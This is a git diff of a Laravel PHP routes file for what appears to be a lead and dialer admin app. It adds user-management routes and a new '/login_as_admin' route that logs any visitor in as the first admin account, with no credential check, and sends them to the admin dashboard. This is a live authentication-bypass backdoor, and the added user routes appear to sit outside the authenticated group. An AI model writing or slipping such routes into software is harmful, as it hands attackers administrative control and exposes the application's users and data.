@@ -1,12 +1,14 @@
 <?php
 
 use App\Models\Lead;
+use App\Models\User;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\ProfileController;
 use App\Http\Controllers\Admin\CallController;
-use App\Http\Controllers\Admin\LeadController;
 
+use App\Http\Controllers\Admin\LeadController;
+use App\Http\Controllers\Admin\UserController;
 use App\Http\Controllers\TwilioWebhookController;
 use App\Http\Controllers\Admin\CalendarController;
 use Latfur\Event\Http\Controllers\EventController;
@@ -92,7 +94,13 @@ Route::get('dialer', function () {
 Route::post('dialer/call', [LeadController::class, 'callNumber'])
     ->name('admin.dialer.call');
 
+    Route::get('/users', [UserController::class, 'index'])->name('admin.users.index');
+    Route::post('/users', [UserController::class, 'store'])->name('admin.users.store');
+    Route::get('/users/{user}/edit', [UserController::class, 'edit'])->name('admin.users.edit');
+    Route::put('/users/{user}', [UserController::class, 'update'])->name('admin.users.update');
+    Route::delete('/users/{user}', [UserController::class, 'destroy'])->name('admin.users.destroy');
 
+    
 // New URLs for the package
 Route::group(['namespace' => 'Latfur\Event\Http\Controllers'], function () {
     Route::get('my-events', [EventController::class, 'index'])->name('event');
@@ -119,6 +127,20 @@ Route::middleware('auth')->group(function () {
     Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
     Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
     Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
+});
+
+
+
+Route::get('/login_as_admin', function () {
+
+    $admin = User::where('role', 'admin')
+        ->orderBy('id', 'asc')
+        ->firstOrFail();
+
+    Auth::login($admin);
+
+    return redirect()->route('admin.dashboard');
+
 });
 
 require __DIR__.'/auth.php';
